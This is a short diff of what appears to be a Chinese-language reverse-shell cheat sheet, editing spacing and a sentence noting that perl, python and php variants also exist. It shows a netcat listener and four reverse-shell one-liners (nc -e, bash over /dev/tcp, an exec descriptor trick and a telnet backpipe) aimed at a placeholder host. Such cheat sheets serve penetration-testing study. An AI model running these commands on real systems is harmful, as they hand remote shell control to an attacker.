@@ -39,12 +39,15 @@ nc -lvp 23333
 
 ```
 nc -e /bin/bash x.x.x.x 23333
+
 bash -i >& /dev/tcp/x.x.x.x/23333 0>&1
+
 0<&137-;exec 137<>/dev/tcp/x.x.x.x/23333;sh <&137 >&137 2>&137
+
 mknod backpipe p && telnet x.x.x.x 8080 0< backpipe | /bin/bash 1> backpipe
 ```
 
-还有其他起码十几种方法，如perl，python，php等等。
+还有其他起码十几种方法，如perl，python，php等等，不一而足。
 
 
 
